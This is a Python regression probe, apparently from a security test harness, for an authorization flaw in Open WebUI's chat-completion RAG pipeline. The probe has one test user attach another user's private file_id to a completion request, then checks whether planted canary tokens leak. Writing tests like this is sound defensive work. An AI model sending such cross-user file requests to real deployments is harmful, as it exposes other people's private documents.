"""
Behavioral Regression Probe for CVE-2026-44560.
Target: Open WebUI <= 0.8.12 (Patched in >= 0.9.0)
Bug Class: Missing Authorization on Route (Chat Completion get_sources_from_items BOLA)
Channel: citation_metadata

Mechanism:
In Open WebUI <= 0.8.12, get_sources_from_items() in the RAG chat-completion source-resolution
pipeline resolved file and collection references attached in the 'files' parameter without
verifying whether the requesting user owned or had authorized access to the resource.
Authenticated users could extract unauthorized document chunks by supplying a victim's file_id
in POST /api/chat/completions.
"""

from typing import List, Optional
from adapters.base import TargetAdapter, UserSession
from core.engine import CanaryToken, ProbingEngine, ProbeResult, LeakSeverity

CVE_ID = "CVE-2026-44560"
CHANNEL = "citation_metadata"
BUG_CLASS = "missing_authorization_on_route"
PRECONDITION = None


def run(
    adapter: TargetAdapter,
    base_url: str,
    alice: UserSession,
    bob: UserSession,
    planted_canaries: List[CanaryToken],
    engine: ProbingEngine,
    dry_run: bool = False,
) -> ProbeResult:
    """Execute behavioral regression probe for CVE-2026-44560."""
    alice_file_ids = alice.metadata.get("file_ids", []) if isinstance(alice.metadata, dict) else []
    target_file_id = None
    if isinstance(alice_file_ids, list) and alice_file_ids:
        candidate = alice_file_ids[0]
        if isinstance(candidate, str) and candidate.strip():
            target_file_id = candidate.strip()

    if not target_file_id:
        return ProbeResult(
            probe_id="cve44560",
            probe_prompt="Chat completion RAG query attaching unauthorized file (CVE-2026-44560)",
            probe_category=f"cve_regression:{CVE_ID}",
            target_response="INCONCLUSIVE: Missing required target file ID in victim (Alice) metadata.",
            retrieved_contexts=[],
            leaked_canaries=[],
            severity=LeakSeverity.NONE,
            channel=CHANNEL,
            inconclusive=True,
        )

    prompt_label = f"Chat completion RAG query attaching unauthorized file '{target_file_id}' (CVE-2026-44560)"

    if dry_run:
        return engine.evaluate_response(
            prompt=prompt_label,
            response_text="Direct query access denied (403 Forbidden).",
            retrieved_contexts=[],
            planted_canaries=planted_canaries,
            probe_category=f"cve_regression:{CVE_ID}",
            channel=CHANNEL,
        )

    # Bob dispatches chat completion specifying Alice's private file_id in the 'files' payload,
    # directly exercising get_sources_from_items() in Open WebUI's chat-completion pipeline.
    unauthorized_files = [{"type": "file", "id": target_file_id}]
    resp_text, retrieved_ctx, raw_resp = adapter.query_rag(
        base_url,
        bob,
        prompt="Summarize the confidential canary contents from the attached file.",
        files=unauthorized_files,
    )

    # Comprehensive multi-channel leak detection:
    # 1. Generated assistant message text (resp_text)
    # 2. Citation metadata and source references (retrieved_ctx)
    # 3. Attached context chunks (retrieved_ctx)
    # 4. Raw response payload stringified fallback (raw_resp)
    # Confirmed leak requires detecting the actual planted cryptographic canary token.
    return engine.evaluate_response(
        prompt=prompt_label,
        response_text=resp_text,
        retrieved_contexts=retrieved_ctx,
        planted_canaries=planted_canaries,
        raw_response=raw_resp,
        probe_category=f"cve_regression:{CVE_ID}",
        channel=CHANNEL,
    )

